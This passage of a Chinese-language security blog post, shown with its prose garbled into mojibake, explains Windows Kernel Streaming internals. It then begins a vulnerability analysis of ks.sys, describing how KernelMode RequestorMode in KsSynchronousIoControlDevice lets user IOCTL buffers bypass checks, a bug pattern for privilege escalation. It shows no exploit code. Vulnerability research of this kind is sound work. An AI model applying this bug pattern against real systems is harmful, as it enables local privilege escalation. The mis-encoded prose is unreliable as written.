title="è®¾å¤‡äº¤äº’"></a>è®¾å¤‡äº¤äº’</h2><p>åœ¨æˆ‘ä»¬æƒ³è¦ä¸éŸ³é¢‘è®¾å¤‡å’Œè§†è®¯é•œå¤´ç­‰è®¾å¤‡äº¤äº’æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡CreateFileå‡½æ•°å¼€å¯ä¸€ä¸ªè®¾å¤‡ï¼Œé‚£ä¹ˆè¿™ç±»å‹çš„è®¾å¤‡ï¼Œä¸ä¼šåƒæ˜¯<code>\Devcie\NamedPipe</code>è¿™ç±»å‹çš„åç§°ï¼Œè€Œæ˜¯ä¼šåƒä¸‹é¢è¿™æ ·çš„è·¯å¾„:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\?\hdaudio#subfunc_01&amp;ven_8086&amp;dev_2812&amp;nid_0001&amp;subsys_00000000&amp;rev_1000#<span class="number">6</span>&amp;<span class="number">2f</span>1f346a&amp;<span class="number">0</span>&amp;<span class="number">0002</span>&amp;<span class="number">0000001</span>d#&#123;<span class="number">6994</span>ad04<span class="number">-93</span>ef<span class="number">-11</span>d0-a3cc<span class="number">-00</span>a0c9223196&#125;\ehdmiouttopo</span><br></pre></td></tr></table></figure><ol><li><p>è·¯å¾„å‰ç¼€<code>\\?\</code></p><ul><li>Windows ä¸­ä¸€ä¸ªç‰¹æ®Šçš„è·¯å¾„å‰ç¼€ï¼Œç”¨äºæŒ‡ç¤ºç³»ç»Ÿå°†åé¢çš„è·¯å¾„è§†ä¸ºä¸€ä¸ªâ€œåŸå§‹è®¾å¤‡è·¯å¾„â€æˆ–â€œé•¿è·¯å¾„â€ã€‚å®ƒ<strong>ç»•è¿‡äº†é€šå¸¸çš„è·¯å¾„è§£æé™åˆ¶</strong>ï¼ˆä¾‹å¦‚ï¼Œ260ä¸ªå­—ç¬¦çš„MAX_PATHé™åˆ¶ï¼‰å’ŒæŸäº›æ–‡ä»¶ç³»ç»Ÿè§£æè§„åˆ™ã€‚</li></ul></li><li><p>è®¾å¤‡ç±»å‹æ ‡è¯†</p><p><code>hdaudio</code>ï¼šè¡¨ç¤ºè®¾å¤‡ä¸º <strong>é«˜æ¸…éŸ³é¢‘æ§åˆ¶å™¨</strong>ï¼ˆå¦‚ Intel HD Audioï¼‰</p><p>ç±»ä¼¼è¿˜æœ‰ï¼š</p><ul><li><code>usb#vid_xxxx&amp;pid_xxxx</code>ï¼ˆUSB æ‘„åƒå¤´ï¼‰</li><li><code>pci#ven_xxxx&amp;dev_xxxx</code>ï¼ˆPCI è§†é¢‘é‡‡é›†å¡ï¼‰</li></ul></li><li><p>subfunc_01ä»£è¡¨ä¸€ä¸ªç‰¹æ®Šçš„åŠŸèƒ½</p></li><li><p>ç¡¬ä»¶æ ‡è¯†ç¬¦</p><p><code>ven_8086</code>ï¼šå‚å•† ID</p><p><code>dev_2812</code>ï¼šè®¾å¤‡å‹å·</p><p><code>nid_0001</code>ï¼šèŠ‚ç‚¹ ID</p></li><li><p>GUID éƒ¨åˆ†</p><p><code>&#123;6994ad04-93ef-11d0-a3cc-00a0c9223196&#125;</code>ï¼šWindows å®šä¹‰çš„è®¾å¤‡æ¥å£ç±» GUIDï¼ˆæ­¤å¤„æ˜¯ <strong>KSCATEGORY_AUDIO</strong>ï¼Œè¡¨ç¤ºéŸ³é¢‘è®¾å¤‡ï¼‰</p><p>å…¶ä»–å¸¸è§ GUIDï¼š</p><ul><li>æ‘„åƒå¤´ï¼š<code>&#123;65E8773D-8F56-11D0-A3B9-00A0C9223196&#125;</code></li><li>è§†é¢‘é‡‡é›†ï¼š<code>&#123;53172480-4791-11D0-A5D6-28DB04C10000&#125;</code></li></ul></li><li><p>åŠŸèƒ½ç«¯ç‚¹</p><p><code>ehdmiouttopo</code>ï¼šè¡¨ç¤ºè®¾å¤‡çš„ç‰¹å®šåŠŸèƒ½ç«¯ç‚¹ï¼ˆæ­¤å¤„æ˜¯ <em>HDMI</em> éŸ³é¢‘è¾“å‡ºæ‹“æ‰‘ï¼‰</p></li></ol><h2 id="æšä¸¾è®¾å¤‡ï¼ˆEnumerate-deviceï¼‰"><a href="#æšä¸¾è®¾å¤‡ï¼ˆEnumerate-deviceï¼‰" class="headerlink" title="æšä¸¾è®¾å¤‡ï¼ˆEnumerate deviceï¼‰"></a>æšä¸¾è®¾å¤‡ï¼ˆEnumerate deviceï¼‰</h2><p>ç”±äºç¡¬ä»¶é…ç½®ã€å‚å•† IDã€è®¾å¤‡å®ä¾‹ ID ç­‰å·®å¼‚ï¼ŒéŸ³é¢‘&#x2F;è§†é¢‘è®¾å¤‡çš„è·¯å¾„ï¼ˆå¦‚ <code>\\?\hdaudio#...</code>ï¼‰æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œ<strong>ä¸èƒ½ç¡¬ç¼–ç </strong>åœ¨ä»£ç ä¸­</p><p>è¦ä½¿ç”¨ Windows æä¾›çš„è®¾å¤‡ç®¡ç† APIï¼ˆå¦‚ <code>SetupDi*</code> ç³»åˆ—å‡½æ•°ï¼‰åŠ¨æ€è·å–è®¾å¤‡è·¯å¾„</p><p><code>SetupDi*</code>ç³»åˆ—æ ¸å¿ƒapi</p><ol><li><p>**<code>SetupDiGetClassDevs</code>**è·å–æŒ‡å®šè®¾å¤‡ç±»åˆ«ï¼ˆå¦‚éŸ³é¢‘ã€æ‘„åƒå¤´ï¼‰çš„æ‰€æœ‰è®¾å¤‡åˆ—è¡¨ã€‚</p><p>å‚æ•°ï¼š</p><ul><li><code>ClassGuid</code>ï¼šè®¾å¤‡ç±»åˆ«çš„ GUIDï¼ˆå¦‚ <code>KSCATEGORY_AUDIO</code>ï¼‰ã€‚</li><li><code>Flags</code>ï¼šæ§åˆ¶æšä¸¾èŒƒå›´ï¼ˆå¦‚ <code>DIGCF_PRESENT</code> åªæšä¸¾å½“å‰è¿æ¥çš„è®¾å¤‡ï¼‰ã€‚</li></ul></li><li><p>**<code>SetupDiEnumDeviceInterfaces</code>**éå†è®¾å¤‡åˆ—è¡¨ï¼Œè·å–æ¯ä¸ªè®¾å¤‡çš„æ¥å£ä¿¡æ¯ï¼ˆåŒ…æ‹¬è®¾å¤‡è·¯å¾„ï¼‰ã€‚</p></li><li><p>**<code>SetupDiGetDeviceInterfaceDetail</code>**è·å–è®¾å¤‡çš„è¯¦ç»†è·¯å¾„ï¼ˆå³ <code>\\?\hdaudio#...</code> æ ¼å¼çš„å­—ç¬¦ä¸²ï¼‰ã€‚</p></li></ol><p>ä¹Ÿå¯ä»¥ä½¿ç”¨KS æ‰€æä¾›çš„<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ksproxy/nf-ksproxy-ksopendefaultdevice">KsOpenDefaultDevice</a>è·å¾—æŒ‡å®šPnPç±»åˆ«çš„ç¬¬ä¸€ä¸ªè®¾å¤‡çš„Handleï¼Œå®é™…ä¸Šæ¥è¯´ä¹Ÿåªæ˜¯<code>SetupDiGetClassDevs</code> å’Œ<code>CreateFile</code> çš„å°è£…è€Œå·²ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">KSDDKAPI HRESULT <span class="title">KsOpenDefaultDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  REFGUID     Category, <span class="comment">// PnPçš„ç±»åˆ«æ ‡ç­¾</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  ACCESS_MASK Access,   <span class="comment">// æŒ‡å®šå¦‚ä½•è®¿é—®é»˜è®¤è®¾å¤‡çš„ ACCESS_MASK ä½æ©ç </span></span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PHANDLE     DeviceHandle <span class="comment">//æŒ‡å‘æ¥æ”¶æ‰€æ‰“å¼€çš„é»˜è®¤è®¾å¤‡çš„å¥æŸ„çš„å˜é‡çš„æŒ‡é’ˆ</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Ks.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;KsMedia.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE g_hDevice;</span><br><span class="line">HRESULT hr = <span class="built_in">KsOpenDefaultDevice</span>(</span><br><span class="line">    KSCATEGORY_VIDEO_CAMERA,</span><br><span class="line">    GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">    &amp;g_hDevice</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="å†…æ ¸æµå¯¹è±¡ï¼ˆKernel-Streaming-objectï¼‰"><a href="#å†…æ ¸æµå¯¹è±¡ï¼ˆKernel-Streaming-objectï¼‰" class="headerlink" title="å†…æ ¸æµå¯¹è±¡ï¼ˆKernel Streaming objectï¼‰"></a>å†…æ ¸æµå¯¹è±¡ï¼ˆKernel Streaming objectï¼‰</h2><p><em>Kernel Streaming</em> ä¼šåœ¨Kernel ä¸­å»ºç«‹ä¸€äº›ç›¸å…³çš„Instanceï¼ˆå®ä¾‹ï¼‰ï¼Œå…¶ä¸­æœ€ä¸ºé‡è¦çš„å°±æ˜¯<em>KS Filters</em>åŠ<em>KS Pins</em>ã€‚</p><h3 id="KS-filters"><a href="#KS-filters" class="headerlink" title="KS filters"></a>KS filters</h3><p>æ¯ä¸ªKSè¿‡æ»¤å™¨é€šå¸¸ä»£è¡¨ä¸€ä¸ªç‰©ç†è®¾å¤‡æˆ–è®¾å¤‡çš„ç‰¹å®šåŠŸèƒ½æ¨¡(ä¸ä»…é™äºç‰©ç†è®¾å¤‡ï¼Œä¹Ÿå¯ä»¥ç”¨äºè™šæ‹Ÿè®¾å¤‡æˆ–è½¯ä»¶å±‚é¢çš„å¤„ç†), ä½œä¸ºæ•°æ®å¤„ç†çš„ä¸­å¿ƒæ¢çº½ï¼Œæ‰€æœ‰æµæ•°æ®éƒ½è¦é€šè¿‡è¿‡æ»¤å™¨è¿›è¡Œå¤„ç†</p><blockquote><p>ä¾‹å¦‚: æ‰“å¼€éŸ³é¢‘è®¾å¤‡åä¼šå¯¹åº”åˆ°ä¸€ä¸ªéŸ³é¢‘è¿‡æ»¤å™¨ï¼Œè¿‡æ»¤å™¨å¯èƒ½ç”±å¤šä¸ªèŠ‚ç‚¹ç»„æˆï¼ŒèŠ‚ç‚¹å¯¹æµæ•°æ®è¿›è¡Œå¤„ç†ã€‚éŸ³é¢‘è¿‡æ»¤å™¨é€šå¸¸ä¼šå¤„ç†éŸ³é¢‘æ•°æ®æµï¼Œä½†å®ƒå¯èƒ½åŒ…å«å¤šä¸ªå­åŠŸèƒ½ï¼ˆå¦‚<strong>è§£ç ã€ç¼–ç ã€æ•ˆæœå¤„ç†</strong>ç­‰ï¼‰</p></blockquote><p>æ¦‚å¿µä¸Šå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸­é—´çš„å¤§æ¡†è¡¨ç¤ºä¸€ä¸ªä»£è¡¨éŸ³è®¯è®¾å¤‡çš„KS filterã€‚è€Œæˆ‘ä»¬æƒ³è¦ä»éŸ³è®¯è®¾å¤‡ä¸­è¯»å–èµ„æ–™æ—¶ï¼Œä¼šä»å·¦è¾¹è¯»å…¥Filterï¼Œç»è¿‡å‡ ä¸ªèŠ‚ç‚¹è¿›è¡Œå¤„ç†åï¼Œä»å³è¾¹è¾“å‡ºã€‚</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116855.png" alt="image-20250902213806097" style="zoom:50%;" /><h3 id="KS-pins"><a href="#KS-pins" class="headerlink" title="KS pins"></a>KS pins</h3><p>ä½œä¸ºè¿‡æ»¤å™¨çš„æ•°æ®è¾“å…¥&#x2F;è¾“å‡ºç«¯ç‚¹, å¿…é¡»é€šè¿‡Pinå®ä¾‹æ‰èƒ½å¯¹Filterè¿›è¡Œæ•°æ®è¯»å†™æ“ä½œ</p><p>ä¸»è¦ä½œç”¨æœ‰: æ˜ç¡®åŒºåˆ†è¾“å…¥ç«¯å’Œè¾“å‡ºç«¯, å®šä¹‰æ”¯æŒçš„æ•°æ®æ ¼å¼å’Œä¼ è¾“ç‰¹æ€§, æ§åˆ¶æ•°æ®æµçš„æ–¹å‘å’Œè¡Œä¸º</p><h2 id="KS-Propertyï¼ˆå±æ€§ç®¡ç†ç³»ç»Ÿï¼‰"><a href="#KS-Propertyï¼ˆå±æ€§ç®¡ç†ç³»ç»Ÿï¼‰" class="headerlink" title="KS Propertyï¼ˆå±æ€§ç®¡ç†ç³»ç»Ÿï¼‰"></a>KS Propertyï¼ˆå±æ€§ç®¡ç†ç³»ç»Ÿï¼‰</h2><p>æ¯ä¸ªKS Objectéƒ½æœ‰è‡ªå·±çš„KS Propertyï¼Œæ¯ä¸ªPropertyéƒ½ä¼šæœ‰ç›¸å¯¹åº”çš„åŠŸèƒ½ï¼Œå‰é¢æ‰€æåˆ°çš„Pin ä¸­çš„æ•°æ®æ ¼å¼ã€éŸ³é‡å¤§å°åŠè®¾å¤‡çš„çŠ¶æ€ç­‰ç­‰ï¼Œé€šå¸¸ä¼šå¯¹åº”åˆ°ä¸€ç»„GUIDï¼Œæˆ‘ä»¬å¯ä»¥é€è¿‡<em>IOCTL_KS_PROPERTY</em>æ¥è¯»å–æˆ–è®¾å®šè¿™äº›Property</p><h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><p>ä¾‹å¦‚åº”ç”¨ç¨‹åºä»è§†é¢‘æ‘„åƒå¤´è¯»å–æ•°æ®çš„æµç¨‹å¤§è‡´å¦‚ä¸‹å›¾</p><p>å…¶æœ€ç®€å•çš„æµç¨‹å¤§æ¦‚å¦‚è¿™å¼ å›¾æ‰€ç¤º :</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116856.png" alt="image-20250902214613487" style="zoom:50%;" /><ol><li>å¼€å¯è®¾å¤‡åè·å¾—è®¾å¤‡Handle</li><li>ä½¿ç”¨è¿™ä¸ªHandle åœ¨è¿™ä¸ªFilter ä¸Šå»ºç«‹Pin çš„Instance å¹¶è·å¾—Pin handle</li><li>ä½¿ç”¨IOCTL_KS_PROPERTY è®¾ç½®Pin çš„çŠ¶æ€åˆ°RUN</li><li>æœ€åå°±å¯ä»¥ä½¿ç”¨ <em>IOCTL_KS_READ_STREAM</em> ä»è¿™ä¸ªPin ä¸­è¯»èµ„æ–™è¿›æ¥</li></ol><h2 id="å†…æ ¸æµå¼ä¼ è¾“æ¶æ„-Kernel-Streaming-architecture"><a href="#å†…æ ¸æµå¼ä¼ è¾“æ¶æ„-Kernel-Streaming-architecture" class="headerlink" title="å†…æ ¸æµå¼ä¼ è¾“æ¶æ„ (Kernel Streaming architecture)"></a>å†…æ ¸æµå¼ä¼ è¾“æ¶æ„ (Kernel Streaming architecture)</h2><p>æ•´ä¸ªå†…æ ¸æµå¼ä¼ è¾“æ¶æ„å¤§è‡´å¦‚ä¸‹å›¾</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116857.png" alt="image-20250902215335970" style="zoom: 50%;" /><p>åœ¨Kernel Stearming å…ƒä»¶ä¸­ï¼Œæœ€ä¸ºæ ¸å¿ƒçš„å°±æ˜¯ksthunk.sys åŠks.sysï¼Œå‡ ä¹æ‰€æœ‰åŠŸèƒ½éƒ½ä¼šä¸å®ƒä»¬æœ‰å…³ã€‚</p><h3 id="ksthunk"><a href="#ksthunk" class="headerlink" title="ksthunk"></a>ksthunk</h3><p><strong>å†…æ ¸æµå¼ WOW Thunk æœåŠ¡é©±åŠ¨ç¨‹åº</strong></p><p>åœ¨è°ƒç”¨ DeviceIoControl åº”ç”¨åï¼Œåœ¨ Kernel Streaming çš„å…¥å£ç‚¹ ï¼Œä½†å®ƒåŠŸèƒ½å¾ˆç®€å•ï¼Œè´Ÿè´£å°† WoW64 è¿›ç¨‹ä¸­çš„ 32 ä½è¯·æ±‚è½¬æ¢æˆ 64 ä½è¯·æ±‚ï¼Œä½¿å¾—ä¸‹å±‚çš„é©±åŠ¨å°±ä¸å¿…ä¸º 32 ä½ç»“æ„å¦å¤–å¤„ç†ã€‚</p><blockquote><p><code>ksthunk.sys</code> æ˜¯ä¸€ä¸ªä¸“é—¨ä¸ºå¤šåª’ä½“ï¼ˆKernel Streamingï¼‰è®¾è®¡çš„â€œç¿»è¯‘å±‚â€é©±åŠ¨ã€‚å®ƒä½œä¸ºä¸­é—´äººï¼Œå°†æ¥è‡ªè€æ—§32ä½åº”ç”¨ç¨‹åºçš„è¯·æ±‚è½¬æ¢ä¸ºç°ä»£64ä½é©±åŠ¨èƒ½å¤Ÿç†è§£çš„æ ¼å¼ï¼Œä»è€Œå®ç°äº†å®Œç¾çš„å‘åå…¼å®¹æ€§</p></blockquote><h3 id="ks"><a href="#ks" class="headerlink" title="ks"></a>ks</h3><p>å†…æ ¸è¿æ¥å’Œæµæ¶æ„åº“</p><p>å†…æ ¸æµåª’ä½“çš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œå®ƒæ˜¯å†…æ ¸æµåª’ä½“çš„åº“å‡½æ•°ï¼Œè´Ÿè´£è½¬å‘ <em>IOCTL_KS_PROPERTY</em> ç­‰è¯·æ±‚åˆ°å¯¹åº”è®¾å¤‡çš„é©±åŠ¨ç¨‹åºä¸­ï¼ŒåŒæ—¶ä¹Ÿä¼šè´Ÿè´£å¤„ç† <em>AVStream</em> çš„ç›¸å…³åŠŸèƒ½ã€‚</p><h3 id="IOCTL-KS-çš„å·¥ä½œæµç¨‹"><a href="#IOCTL-KS-çš„å·¥ä½œæµç¨‹" class="headerlink" title="IOCTL_KS_* çš„å·¥ä½œæµç¨‹"></a>IOCTL_KS_* çš„å·¥ä½œæµç¨‹</h3><p>å½“è°ƒç”¨DeviceIoControlæ—¶ï¼Œå°±ä¼šåƒä¸‹å›¾ä¸€æ ·ï¼Œå°†ä½¿ç”¨è€…çš„requestæŒ‰ç…§é¡ºåºå‘ç»™ç›¸åº”çš„driverå¤„ç†</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116858.png" alt="image-20250903105703365" style="zoom:50%;" /><p>è€Œåˆ°ç¬¬ 6 æ­¥æ—¶ ks.sys å°±ä¼šæ ¹æ®ä½  requests çš„ <em>Property</em> æ¥æ±ºå®šè¦äº¤ç»™å“ªä¸ª driver åŠ handler ä¾†å¤„ç†ä½ çš„ requestã€‚</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116859.png" alt="image-20250903105826847" style="zoom:50%;" /><p>æœ€ç»ˆå†è½¬å‘ç»™ç›¸åº”çš„driver(é©±åŠ¨ç¨‹åº)ï¼Œå¦‚ä¸Šå›¾æœ€åè½¬å‘ç»™ portcls ä¸­çš„ handler æ¥æ“ä½œéŸ³é¢‘è®¾å¤‡</p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="PreviousMode"><a href="#PreviousMode" class="headerlink" title="PreviousMode"></a>PreviousMode</h3><p>å…¶æœ‰ä¸¤ç§å¯èƒ½**<code>UserMode(0)</code><strong>å’Œ</strong><code>KernelMode(1)</code>**, è¯¥å€¼ä¼šå½±å“å†…æ ¸æ˜¯å¦å¯ç”¨æŸäº›æ“ä½œæ¥ä¿éšœå®‰å…¨æ€§</p><table><thead><tr><th align="left">è°ƒç”¨æ–¹å¼</th><th align="left">PreviousMode è®¾ç½®</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">ç”¨æˆ·æ¨¡å¼åº”ç”¨è°ƒç”¨ <code>NtXxx</code></td><td align="left">è‡ªåŠ¨è®¾ä¸º <code>UserMode</code></td><td align="left">ç³»ç»Ÿè°ƒç”¨é™·é˜±å¤„ç†ç¨‹åºï¼ˆå¦‚ <code>syscall</code> &#x2F; <code>sysenter</code>ï¼‰ä¼šè®¾ç½® <code>PreviousMode = UserMode</code>ã€‚</td></tr><tr><td align="left">å†…æ ¸é©±åŠ¨è°ƒç”¨<code>NtXxx</code></td><td align="left">ä¿æŒè°ƒç”¨çº¿ç¨‹çš„åŸæœ‰å€¼</td><td align="left">å¦‚æœçº¿ç¨‹åŸæœ¬æ˜¯ç”¨æˆ·æ¨¡å¼è°ƒç”¨é“¾çš„ä¸€éƒ¨åˆ†ï¼Œ<code>PreviousMode</code> å¯èƒ½ä»æ˜¯ <code>UserMode</code>ï¼Œå¯¼è‡´é”™è¯¯ã€‚</td></tr><tr><td align="left">å†…æ ¸é©±åŠ¨è°ƒç”¨ <code>ZwXxx</code></td><td align="left">å¼ºåˆ¶è®¾ä¸º <code>KernelMode</code></td><td align="left"><code>ZwXxx</code> æ˜¯ <code>NtXxx</code> çš„åŒ…è£…å™¨ï¼Œä¼šä¸´æ—¶è¦†ç›– <code>PreviousMode</code> ä¸º <code>KernelMode</code>ï¼Œé¿å…å®‰å…¨æ£€æŸ¥ã€‚</td></tr></tbody></table><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116860.png" alt="image-20250903114412750" style="zoom:50%;" /><h3 id="RequestorMode"><a href="#RequestorMode" class="headerlink" title="RequestorMode"></a>RequestorMode</h3><p>å¦å¤–ä¸€ä¸ªç±»ä¼¼çš„åˆ™æ˜¯ IRP ä¸­çš„ RequestorMode è¿™è¾¹å°±æ˜¯è®°å½•ä½ åŸå§‹çš„ requests æ˜¯æ¥è‡ª UserMode è¿˜æ˜¯ KernelModeï¼Œåœ¨ Kernel driver ä¸­çš„ä»£ç æ˜¯éå¸¸å¸¸ç”¨åˆ°çš„å­—æ®µï¼Œé€šå¸¸ä¼šæ¥è‡ª PreviousModeã€‚</p><p>åœ¨å†…æ ¸é©±åŠ¨ä¸­ï¼Œå¸¸å¸¸ä¼šç”¨åˆ°è¿™ä¸ªå­—æ®µå†³å®šæ˜¯å¦éœ€è¦å¯¹ç”¨æˆ·çš„requestsåšä¸€äº›é¢å¤–çš„å®‰å…¨æ£€æŸ¥</p><p>å³å¦‚æœç”¨æˆ·æ€å‘é€IRPè¯·æ±‚è¿›å…¥å†…æ ¸æ€åè°ƒç”¨äº†<code>Zw*</code>å‡½æ•°, è€Œ<code>Zw\*</code>å‡½æ•°æœ¬èº«åˆå‘èµ·äº†ä¸€ä¸ªIRPè¯·æ±‚</p><p>æ­¤æ—¶PreviousModeå·²ç»å˜ä¸ºKernelMode, ä½†æ˜¯åæ¥å‘èµ·çš„IRPè¯·æ±‚å´ä¾ç„¶å¯èƒ½åŒ…å«æœ‰ç”¨æˆ·ä¼ é€’çš„å†…å®¹, ä»è€Œä½¿ç”¨æˆ·çš„è¯·æ±‚è§„é¿äº†æŸäº›å®‰å…¨æ£€æŸ¥</p><p>äº‹å®ä¸Šç¡®å®å‡ºç°äº†è¿™ç§é—®é¢˜ï¼š</p><blockquote><p>å¦‚æœè°ƒç”¨æ–¹æä¾›äº†<em><strong>InputBuffer</strong></em>æˆ–<em><strong>OutputBuffer</strong></em>å‚æ•°ï¼Œè¯¥å‚æ•°å¿…é¡»æŒ‡å‘é©»ç•™åœ¨ç³»ç»Ÿå†…å­˜ä¸­çš„ç¼“å†²åŒºã€‚è°ƒç”¨æ–¹éœ€è´Ÿè´£éªŒè¯ä»ç”¨æˆ·æ¨¡å¼ç¼“å†²åŒºå¤åˆ¶åˆ°è¾“å…¥ç¼“å†²åŒºçš„æ‰€æœ‰å‚æ•°å€¼ã€‚è¾“å…¥ç¼“å†²åŒºå¯èƒ½åŒ…å«æ ¹æ®è¯·æ±‚å‘èµ·è€…æ˜¯ç”¨æˆ·æ¨¡å¼åº”ç”¨ç¨‹åºè¿˜æ˜¯å†…æ ¸æ¨¡å¼é©±åŠ¨ç¨‹åºè€Œä¸åŒè§£é‡Šçš„å‚æ•°å€¼ã€‚åœ¨<strong>IoBuildDeviceIoControlRequest</strong>è¿”å›çš„IRPä¸­ï¼Œ<strong>RequestorMode</strong>å­—æ®µå§‹ç»ˆè®¾ç½®ä¸º<strong>KernelMode</strong>ã€‚è¯¥å€¼è¡¨æ˜è¯·æ±‚åŠè¯·æ±‚ä¸­åŒ…å«çš„ä»»ä½•ä¿¡æ¯å‡æ¥è‡ªå¯ä¿¡çš„å†…æ ¸æ¨¡å¼ç»„ä»¶ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯é»˜è®¤æƒ…å†µä¸‹ï¼Œä½¿ç”¨ <em><strong>IoBuildDeviceIoControlRequest</strong></em> è¿™ä¸ªæ–¹æ³•å»åˆ›å»ºä¸€ä¸ª DeviceIoControl çš„ IRP æ—¶ï¼Œå¦‚æœä½ æ²¡æœ‰ç‰¹åˆ«å»è®¾ç½® RequestorMode å°±ä¼šç›´æ¥ä»¥ KernelMode å½¢å¼å»å‘¼å« IOCTLã€‚</p><blockquote><p>è¿™ä¸ª API ä¸»è¦æ˜¯ Kernel driver ç”¨æ¥å‘¼å« IOCTL çš„å…¶ä¸­ä¸€ç§æ–¹æ³•</p></blockquote><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">KsSynchronousIoControlDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">        KPROCESSOR_MODE RequestorMode,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG IoControl,</span></span></span><br><span class="line"><span class="params"><span class="function">        PVOID InBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG InSize,</span></span></span><br><span class="line"><span class="params"><span class="function">        PVOID OutBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG OutSize,</span></span></span><br><span class="line"><span class="params"><span class="function">        PULONG BytesReturned)</span></span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116861.png" alt="image-20250903203907174" style="zoom:50%;" /><p>åœ¨<em>ks!KsSynchronousIoControlDevice</em>å‡½æ•°ä¸­ï¼Œå…ˆè°ƒç”¨äº†<em>IoBuildDeviceIoControlRequest</em>ï¼Œç„¶åæ ¹æ®å‚æ•°è®¾ç½®Irp-&gt;RequestorModeï¼Œä¸”ä¼šæ ¹æ® <em>KsSynchronousIoControlDevice</em> å‚æ•°ä¸åŒè€Œå»è®¾ç½®ä¸åŒçš„æ•°å€¼</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116862.png" alt="image-20250903204146415" style="zoom:50%;" /><p>ç„¶è€Œå‡ ä¹æ‰€æœ‰è°ƒç”¨ <em>ks!KsSynchronousIoControlDevice</em> å‡½æ•°çš„åœ°æ–¹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ€»æ˜¯è®¾ç½®ä¸ºKernelModeï¼ˆ0ï¼‰ï¼Œè¿™å°±å¯¼è‡´äº†å¯èƒ½å­˜åœ¨çš„å®‰å…¨é—®é¢˜</p><p>å› æ­¤æˆ‘ä»¬å°† Kernel Streaming ä¸­çš„ <em>bug pattern</em> è½¬æ¢æˆä¸‹åˆ—å‡ ç‚¹ï¼š</p><ol><li>æœ‰ä½¿ç”¨ <em>KsSynchronousIoControlDevice</em></li><li>æœ‰å¯æ§çš„<ul><li>è¾“å…¥ç¼“å†²åŒº</li><li>è¾“å‡ºç¼“å†²åŒº</li></ul></li><li>ç¬¬äºŒæ¬¡å¤„ç† IOCTL çš„åœ°æ–¹æœ‰ä¾èµ– RequestorMode åšå®‰å…¨æ£€æŸ¥ï¼Œå¹¶ä¸”æœ‰å¯ä»¥ä½œä¸ºææƒåˆ©ç”¨çš„åœ°æ–¹ã€‚ ï¼ˆè¿™ä¸ªæ¡ä»¶è¯´æ˜åœ¨åŸæœ¬ç¬¬äºŒæ¬¡å¤„ç† IOCTL çš„æ—¶å€™ï¼Œå¦‚æœä¸åšæ£€æŸ¥ï¼Œå°±ä¼šæœ‰å¯èƒ½çš„å®‰å…¨é—®é¢˜ï¼‰</li></ol><p>å¯ä»¥å‘ç°ï¼Œåœ¨<em>ks!SerializePropertySet</em>å’Œ<em>ks!UnserializePropertySet</em>ä¸­éƒ½æœ‰ï¼š(22H2)</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116863.png" alt="image-20250903205141638" style="zoom: 50%;" /><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116864.png" alt="image-20250903213750850" style="zoom:50%;" /></p><p>åœ¨ Kernel Streaming çš„ <code>IOCTL_KS_PROPERTY</code> åŠŸèƒ½ä¸­ï¼Œä¸ºäº†æé«˜æ•ˆç‡</p><p>æä¾›äº† 